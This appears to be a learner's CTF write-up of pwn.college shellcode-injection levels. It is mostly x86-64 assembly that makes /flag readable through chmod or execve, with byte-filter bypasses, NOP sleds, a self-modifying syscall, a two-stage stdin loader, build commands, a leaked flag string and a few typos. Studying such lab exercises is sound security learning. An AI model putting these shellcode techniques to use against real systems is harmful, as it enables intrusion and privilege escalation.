
Compile allowing write:
`gcc -Wl, -N --static nostdlib -o test test.s`
`objcopy --dump-section .text=shellcode-raw shellcode-elf`


## 1 - chmod syscall

```
.global _start_
_start:
.intel_syntax noprefix
```

## 2 - Nop sled 

Challenge will randomly skip up to 0x800 bytes from shellcode. Must pad with `nop` before executing shellcode

We must use a loop to insert a certain number of no operation bytes:

```
    .rept 0x800        # Repeat the following instruction 0x800 times
    nop                # NOP instruction
    .endr              # End of repetition
	-----
	Rest of shellcode
```


## 3 - Input filter: no 0x00 NULL bytes

```
.global _start_
_start:
.intel_syntax noprefix
        xor rbx, rbx
        mov ebx, 0x67616c66
        shl rbx, 8
        mov bl, 0x2f
        push rbx
        mov rdi, rsp
        inc rsi
        inc rsi
        inc rsi
        inc rsi
        mov al, 0x5a
        syscall
```

## 4 - no H (0x48) bytes!!!

0000000000401000 <_start>:
  401000:       bb 66 6c 61 67          mov    ebx,0x67616c66
  401005:       48 c1 e3 08             shl    rbx,0x8
  401009:       b3 2f                   mov    bl,0x2f
  40100b:       53                      push   rbx
  40100c:       48 89 e7                mov    rdi,rsp
  40100f:       48 ff c6                inc    rsi
  401012:       48 ff c6                inc    rsi
  401015:       48 ff c6                inc    rsi
  401018:       48 ff c6                inc    rsi
  40101b:       b0 5a                   mov    al,0x5a
  40101d:       0f 05                   syscall

Hmm...

```
  GNU nano 4.8                                                                                        shellcode.s                                                                                                   
.global _start_
_start:
.intel_syntax noprefix
        # Chmod syscall
        push 0x67616c66
        push rsp
        pop rdi
        mov sil, 4
        mov al, 0x5a
        syscall
```

This only works if in the root dir otherwise you can't have the full string with /flag


## 5 - No syscalls!!! 0x050f

```
.global _start_
_start:
.intel_syntax noprefix
        mov al, 0x5a
        mov sil, 4
        lea rdi, [rip+flag]
        inc word ptr [rip + sys1]
        lea rbx, [rip+sys1]
        call rbx
sys1:
        .word 0x050e
flag:
        .string "/flag"
```



## 6 - first 4096 bytes are non writeable

Add a nop sled

```
  GNU nano 4.8                                                                                        shellcode.s                                                                                                   
.global _start_
_start:
.intel_syntax noprefix
        .rept 0x1000        # Repeat the following instruction 0x1000 times
        nop                # NOP instruction
        .endr              # End of repetition

        mov al, 0x5a
        mov sil, 4
        lea rdi, [rip+flag]
        inc word ptr [rip + sys1]
        lea rbx, [rip+sys1]
        call rbx
sys1:
        .word 0x050e
flag:
        .string "/flag"
```


## 8 - two stage exploit

Quite fun -

Write a small script to cat the flag

```
void main()
{
    chmod("/flag", 4);
}
```

Call it with exeve()

```
  GNU nano 4.8                                                                                        shellcode.s                                                                                                   
.global _start_
_start:
.intel_syntax noprefix
        # Execve syscall
        mov al, 0x3b
        push rax
        mov rdi, rsp 
        xor rsi, rsi
        xor rdx, rdx
        syscall
```

Since the hexcode for the execve syscall is 0x3b as well, we can push $rax and then pop it back in to $rdi as the file-path argument.

credit to https://kunalwalavalkar.gitbook.io/write-ups/pwn-college/shellcode-injection



### 9 - 0xcc interrupts

pwn.college{A5Npi2AV895r-GlDqsVrN8rEDw6.0VNyIDLzITM4UzW}

```
  GNU nano 4.8                                                                                               shellcode.s                                                                                                          
.global _start_
_start:
.intel_syntax noprefix
        push 0x66
        mov rdi, rsp
        push 4
        pop rsi
        jmp next
        .rept 10
        nop
        .endr
/* call chmod() */
next:
        push 0x5a 
        pop rax
        syscall
```


### 10 - Bubblesort

not sure what is sorted? the bytes? the assembly instructions?

Tried with 
```
  GNU nano 4.8                                                                                                                shellcode.s                                                                                                                           
.global _start_
_start:
.intel_syntax noprefix
        mov rax, 0x5a
        mov rsi, 4
        lea rdi, [rip+flag]
        syscall
flag:
        .string "/flag"
```

It worked! Not really sure what was sorted though!

### 12 - unique bytes only!

tricky one!
```
  GNU nano 4.8                                                                                                       shellcode.s                                                                                                                  
.global _start
_start:
.intel_syntax noprefix
        mov al, 0x5a
        xor esi, esi
        add sil, 4  
        push 0x67616c66
        mov rdi, rsp
        syscall
```

### 13 - 12 bytes only!


global _start
_start:
.intel_syntax noprefix
        mov al, 0x3b
        push rax
        mov rdi, rsp 
        xor esi, esi
        xor edx, edx
        syscall

```
void main()
{
    chmod("/flag", 4);
}
```

compile with:

`gcc chmod_script.c -o /;`

This sets the filename to ; which happens to be `0x3b`. This is also the syscall number for execve

### Level 14 - I could not solve this myself - found assistance online

Ingenious...
```
~/shellcode1.s
.intel_syntax noprefix
.global _start
_start:
	push rdx
	pop rsi
	push rax
	pop rdi
	syscall

~/shellcode2.s

.intel_syntax noprefix
.global _start
_start:
	.rept 10
	nop
	.endr
	push 0x66
	mov rdi, rsp
	mov sil, 4
	mov al, 0x5a
	syscall

commands:
ln -s f /flag

gcc -nostdlib -static shellcode1.s -o shellcode1-elf
objcopy --dump-section .text=shellcode1-raw shellcode1-elf

gcc -nostdlib -static shellcode2.s -o shellcode2-elf
objcopy --dump-section .text=shellcode2-raw shellcode2-elf

(cat shellcode1-raw; cat shellcode2-raw) | /challenge/babyshell14
cat /flag
```

credit - anonymous user comment on www.https://j-shiro.github.io/p/pwncollege_note6/

Looking at the strace:

```
map(0x14440000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0) = 0x14440000
write(1, "Mapped 0x1000 bytes for shellcod"..., 49) = 49
write(1, "Reading 0x6 bytes from stdin.\n", 30) = 30
write(1, "\n", 1) = 1
read(0, "R^P_\17\5", 6) = 6
write(1, "This challenge is about to execu"..., 60) = 60
write(1, "\n", 1) = 1
write(1, "      Address      |            "..., 90) = 90
write(1, "\n", 1) = 1
write(1, "--------------------------------"..., 90) = 90
write(1, "\n", 1) = 1
write(1, "0x0000000014440000 | ", 21) = 21
write(1, "52 ", 3) = 3
write(1, " | push rdx\n", 12) = 12
write(1, "0x0000000014440001 | ", 21) = 21
write(1, "5e ", 3) = 3
write(1, " | pop rsi\n", 11) = 11
write(1, "0x0000000014440002 | ", 21) = 21
write(1, "50 ", 3) = 3
write(1, " | push rax\n", 12) = 12
write(1, "0x0000000014440003 | ", 21) = 21
write(1, "5f ", 3) = 3
write(1, " | pop rdi\n", 11) = 11
write(1, "0x0000000014440004 | ", 21) = 21
write(1, "0f ", 3) = 3
write(1, "05 ", 3) = 3
write(1, " | syscall \n", 12) = 12
write(1, "\n", 1) = 1
chmod("f", 004) = -1 EPERM (Operation not permitted)
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xffffffffffffffff} ---
+++ killed by SIGSEGV (core dumped) +++
```

The first stage calls syscall with rax as 0, allowing for more bytes to be read in. I'm assuming the 10 nop instructions. I'm not sure what the nop instructions for the 2nd stage are for though but then using the symbolic link to read the /flag file is great!

